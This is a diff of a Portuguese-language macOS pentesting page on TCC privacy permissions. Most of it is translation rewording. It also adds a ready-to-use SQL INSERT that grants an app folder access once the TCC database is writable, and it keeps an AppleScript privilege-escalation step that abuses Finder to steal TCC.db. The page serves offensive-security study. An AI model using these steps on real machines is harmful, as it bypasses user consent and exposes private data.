@@ -150,7 +150,7 @@ Observe que, mesmo que um dos bancos de dados esteja dentro da pasta pessoal do 
 No entanto, lembre-se de que os usuários _podem_ **excluir ou consultar regras** usando o **`tccutil`**.
 {% endhint %}
 
-#### Redefinir
+#### Resetar
 ```bash
 # You can reset all the permissions given to an application with
 tccutil reset All app.some.id
@@ -160,12 +160,12 @@ tccutil reset All
 ```
 ### Verificações de Assinatura do TCC
 
-O banco de dados do TCC armazena o **ID do Bundle** do aplicativo, mas também **armazena informações** sobre a **assinatura** para **garantir** que o aplicativo que solicita permissão seja o correto.
+O banco de dados do TCC armazena o **ID do Pacote** do aplicativo, mas também **armazena** **informações** sobre a **assinatura** para **garantir** que o aplicativo que solicita permissão seja o correto.
 
 {% code overflow="wrap" %}
 ```bash
 # From sqlite
-sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
+sqlite> select service, client, hex(csreq) from access where auth_value=2;
 #Get csreq
 
 # From bash
@@ -177,17 +177,17 @@ csreq -t -r /tmp/telegram_csreq.bin
 {% endcode %}
 
 {% hint style="warning" %}
-Portanto, outros aplicativos que usam o mesmo nome e ID de pacote não poderão acessar as permissões concedidas a outros aplicativos.
+Portanto, outras aplicações que usam o mesmo nome e ID de pacote não poderão acessar as permissões concedidas a outras aplicações.
 {% endhint %}
 
 ### Entitlements
 
-Os aplicativos **não apenas precisam** solicitar e ter **acesso concedido** a alguns recursos, eles também precisam **ter as permissões relevantes**.\
-Por exemplo, o **Telegram** tem a permissão `com.apple.security.device.camera` para solicitar **acesso à câmera**. Um **aplicativo** que **não tenha** essa **permissão não poderá** acessar a câmera (e o usuário nem mesmo será solicitado a conceder as permissões).
+As aplicações **não apenas precisam** solicitar e ter sido **concedido acesso** a alguns recursos, elas também precisam **ter as permissões relevantes**.\
+Por exemplo, o **Telegram** tem a permissão `com.apple.security.device.camera` para solicitar **acesso à câmera**. Uma **aplicação** que **não tenha** essa **permissão não poderá** acessar a câmera (e o usuário nem mesmo será solicitado a conceder as permissões).
 
-No entanto, para que os aplicativos tenham **acesso a determinadas pastas do usuário**, como `~/Desktop`, `~/Downloads` e `~/Documents`, eles **não precisam** ter nenhuma **permissão específica**. O sistema lidará com o acesso de forma transparente e **solicitará permissão ao usuário** conforme necessário.
+No entanto, para que as aplicações tenham **acesso a determinadas pastas do usuário**, como `~/Desktop`, `~/Downloads` e `~/Documents`, elas **não precisam** ter nenhuma **permissão específica**. O sistema lidará com o acesso de forma transparente e **solicitará permissão ao usuário** conforme necessário.
 
-Os aplicativos da Apple **não gerarão solicitações**. Eles contêm **direitos pré-concedidos** em sua lista de **permissões**, o que significa que eles **nunca gerarão um pop-up** e também não aparecerão em nenhum dos **bancos de dados do TCC**. Por exemplo:
+As aplicações da Apple **não gerarão solicitações**. Elas contêm **direitos pré-concedidos** em sua lista de **permissões**, o que significa que elas **nunca gerarão um pop-up** e **não** aparecerão em nenhum dos **bancos de dados do TCC**. Por exemplo:
 ```bash
 codesign -dv --entitlements :- /System/Applications/Calendar.app
 [...]
@@ -233,16 +233,58 @@ uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 Também observe que se você mover um arquivo que permite o UUID de um aplicativo em seu computador para um computador diferente, porque o mesmo aplicativo terá UIDs diferentes, ele não concederá acesso a esse aplicativo.
 {% endhint %}
 
-O atributo estendido `com.apple.macl` **não pode ser removido** como outros atributos estendidos porque está **protegido pelo SIP**. No entanto, como [**explicado neste post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), é possível desabilitá-lo **compactando** o arquivo, **excluindo-o** e **descompactando-o**.
+O atributo estendido `com.apple.macl` **não pode ser removido** como outros atributos estendidos porque ele é **protegido pelo SIP**. No entanto, como [**explicado neste post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), é possível desabilitá-lo **compactando** o arquivo, **excluindo-o** e **descompactando-o**.
 
-## Privilégios de Escalação e Bypass do TCC
+## Privilégios e Bypasses do TCC
 
-### Escalação de Privilégios de Automação para FDA
+### Inserir no TCC
 
-O **Finder** é um aplicativo que **sempre possui FDA** (mesmo que não apareça na interface do usuário), portanto, se você tiver privilégios de **Automação** sobre ele, poderá abusar de seus privilégios para **fazer com que ele execute algumas ações**.
+Se em algum momento você conseguir obter acesso de gravação em um banco de dados do TCC, você pode usar algo como o seguinte para adicionar uma entrada (remova os comentários):
+```
+INSERT INTO access (
+service,
+client,
+client_type,
+auth_value,
+auth_reason,
+auth_version,
+csreq,
+policy_id,
+indirect_object_identifier_type,
+indirect_object_identifier,
+indirect_object_code_identity,
+flags,
+last_modified,
+pid,
+pid_version,
+boot_uuid,
+last_reminded
+) VALUES (
+'kTCCServiceSystemPolicyDesktopFolder', -- service
+'com.googlecode.iterm2', -- client
+0, -- client_type (0 - bundle id)
+2, -- auth_value  (2 - allowed)
+3, -- auth_reason (3 - "User Set")
+1, -- auth_version (always 1)
+X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
+NULL, -- policy_id
+NULL, -- indirect_object_identifier_type
+'UNUSED', -- indirect_object_identifier - default value
+NULL, -- indirect_object_code_identity
+0, -- flags
+strftime('%s', 'now'), -- last_modified with default current timestamp
+NULL, -- assuming pid is an integer and optional
+NULL, -- assuming pid_version is an integer and optional
+'UNUSED', -- default value for boot_uuid
+strftime('%s', 'now') -- last_reminded with default current timestamp
+);
+```
+### Privesc de Automação para FDA
+
+**Finder** é um aplicativo que **sempre tem FDA** (mesmo que não apareça na interface do usuário), então se você tiver privilégios de **Automação** sobre ele, você pode abusar de seus privilégios para **fazer com que ele execute algumas ações**.
 
 {% tabs %}
-{% tab title="Roubar o TCC.db dos usuários" %}
+{% tab title="Roubar o arquivo TCC.db dos usuários" %}
 ```applescript
 # This AppleScript will copy the system TCC database into /tmp
 osascript<<EOD
@@ -311,7 +353,7 @@ O AllowApplicationsList.plist contém uma lista de identificadores de pacotes de
 
 Ao modificar o AllowApplicationsList.plist, é possível adicionar ou remover identificadores de pacotes de aplicativos para controlar quais aplicativos têm acesso aos dados protegidos pela TCC. No entanto, é importante ter cuidado ao fazer alterações nesse arquivo, pois modificações incorretas podem levar a problemas de segurança ou a aplicativos não funcionando corretamente.
 
-Para editar o AllowApplicationsList.plist, você pode usar um editor de texto ou a linha de comando. Certifique-se de seguir as diretrizes e recomendações da Apple ao fazer alterações nesse arquivo para garantir a segurança e o bom funcionamento do seu sistema macOS.
+Para editar o AllowApplicationsList.plist, é necessário ter privilégios de root no macOS. Recomenda-se fazer um backup do arquivo antes de fazer qualquer alteração e seguir as práticas recomendadas de segurança ao modificar as permissões da TCC.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
